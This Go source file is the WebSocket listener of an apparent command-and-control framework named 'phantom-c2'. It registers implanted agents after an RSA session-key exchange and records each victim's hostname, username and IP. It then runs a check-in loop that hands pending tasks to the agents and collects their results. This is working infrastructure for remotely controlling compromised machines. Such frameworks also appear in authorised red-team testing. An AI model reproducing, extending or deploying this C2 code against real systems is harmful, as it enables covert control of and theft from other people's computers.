package listener

import (
	"context"
	"crypto/rsa"
	"net/http"
	"time"

	"github.com/gorilla/websocket"
	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  65536,
	WriteBufferSize: 65536,
	CheckOrigin:     func(r *http.Request) bool { return true },
}

// WSListener handles WebSocket C2 communications.
// Agents connect via ws:// or wss:// and communicate using the same
// Envelope protocol as HTTP — but over a persistent WS connection.
type WSListener struct {
	ID       string
	Name     string
	Type     string // "ws" or "wss"
	BindAddr string
	TLSCert  string
	TLSKey   string

	server   *http.Server
	privKey  *rsa.PrivateKey
	agentMgr *agent.Manager
	taskDisp *task.Dispatcher
	onEvent  EventCallback
	running  bool
}

// NewWSListener creates a new WebSocket listener.
func NewWSListener(cfg ListenerConfig) *WSListener {
	return &WSListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		Type:     cfg.Type,
		BindAddr: cfg.BindAddr,
		TLSCert:  cfg.TLSCert,
		TLSKey:   cfg.TLSKey,
		privKey:  cfg.PrivKey,
		agentMgr: cfg.AgentMgr,
		taskDisp: cfg.TaskDisp,
		onEvent:  cfg.OnEvent,
	}
}

// Start begins listening for WebSocket connections.
func (l *WSListener) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", l.handleWS)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})

	l.server = &http.Server{
		Addr:         l.BindAddr,
		Handler:      mux,
		ReadTimeout:  120 * time.Second,
		WriteTimeout: 120 * time.Second,
	}

	l.running = true
	if l.onEvent != nil {
		l.onEvent("listener_start", l.Name, l.Type, l.BindAddr)
	}

	var err error
	if l.Type == "wss" && l.TLSCert != "" && l.TLSKey != "" {
		err = l.server.ListenAndServeTLS(l.TLSCert, l.TLSKey)
	} else {
		err = l.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		l.running = false
		return err
	}
	return nil
}

// Stop shuts down the WebSocket listener.
func (l *WSListener) Stop() error {
	l.running = false
	if l.onEvent != nil {
		l.onEvent("listener_stop", l.Name)
	}
	if l.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return l.server.Shutdown(ctx)
	}
	return nil
}

// GetID returns the listener ID.
func (l *WSListener) GetID() string      { return l.ID }
func (l *WSListener) GetName() string    { return l.Name }
func (l *WSListener) GetType() string    { return l.Type }
func (l *WSListener) GetBindAddr() string { return l.BindAddr }

// IsRunning returns whether the listener is active.
func (l *WSListener) IsRunning() bool { return l.running }

// handleWS upgrades the connection and manages the agent session.
func (l *WSListener) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	externalIP := extractIP(r)

	// First message must be a registration envelope
	_, regData, err := conn.ReadMessage()
	if err != nil {
		return
	}

	regEnv, err := protocol.EnvelopeFromBytes(regData)
	if err != nil {
		return
	}

	if regEnv.Type != protocol.MsgRegisterRequest {
		return
	}

	// RSA decrypt to extract session key + registration payload
	sessionKey, regPayload, err := crypto.UnpackKeyExchange(l.privKey, regEnv.Payload)
	if err != nil {
		return
	}

	var regReq protocol.RegisterRequest
	if err := protocol.Unmarshal(regPayload, &regReq); err != nil {
		return
	}

	// Register the agent
	agentRecord, err := l.agentMgr.Register(&regReq, sessionKey, externalIP, l.ID)
	if err != nil {
		return
	}

	if l.onEvent != nil {
		l.onEvent("agent_register", agentRecord.Name, agentRecord.OS, agentRecord.Hostname, agentRecord.Username, externalIP)
	}

	// Build and send registration response
	regResp := protocol.RegisterResponse{
		AgentID: agentRecord.ID,
		Name:    agentRecord.Name,
		Sleep:   agentRecord.Sleep,
		Jitter:  agentRecord.Jitter,
	}
	respPayload, err := protocol.Marshal(regResp)
	if err != nil {
		return
	}
	respEnv, err := protocol.SealEnvelope(protocol.MsgRegisterResponse, sessionKey, respPayload)
	if err != nil {
		return
	}
	if err := conn.WriteMessage(websocket.BinaryMessage, protocol.EnvelopeToBytes(respEnv)); err != nil {
		return
	}

	// Check-in loop — agent sends check-ins, server responds with tasks
	for {
		conn.SetReadDeadline(time.Now().Add(300 * time.Second))
		_, msgData, err := conn.ReadMessage()
		if err != nil {
			break
		}

		env, err := protocol.EnvelopeFromBytes(msgData)
		if err != nil {
			continue
		}

		if env.Type != protocol.MsgCheckIn {
			continue
		}

		ciPayload, err := protocol.OpenEnvelope(env, sessionKey)
		if err != nil {
			continue
		}

		var ciReq protocol.CheckInRequest
		if err := protocol.Unmarshal(ciPayload, &ciReq); err != nil {
			continue
		}

		// Process task results
		for _, result := range ciReq.Results {
			result.AgentID = agentRecord.ID
			l.taskDisp.ProcessResult(&result)
			if l.onEvent != nil {
				l.onEvent("task_result", agentRecord.ID, result.TaskID)
			}
		}

		// Update last seen
		l.agentMgr.CheckIn(agentRecord.ID)

		if l.onEvent != nil {
			l.onEvent("agent_checkin", agentRecord.ID, agentRecord.Name)
		}

		// Get pending tasks
		tasks, err := l.taskDisp.GetPendingTasks(agentRecord.ID)
		if err != nil {
			tasks = nil
		}

		ciResp := protocol.CheckInResponse{Tasks: tasks}
		ciRespPayload, err := protocol.Marshal(ciResp)
		if err != nil {
			continue
		}
		ciRespEnv, err := protocol.SealEnvelope(protocol.MsgCheckInResponse, sessionKey, ciRespPayload)
		if err != nil {
			continue
		}
		conn.WriteMessage(websocket.BinaryMessage, protocol.EnvelopeToBytes(ciRespEnv))
	}

	if l.onEvent != nil {
		l.onEvent("agent_disconnect", agentRecord.ID, agentRecord.Name)
	}
}
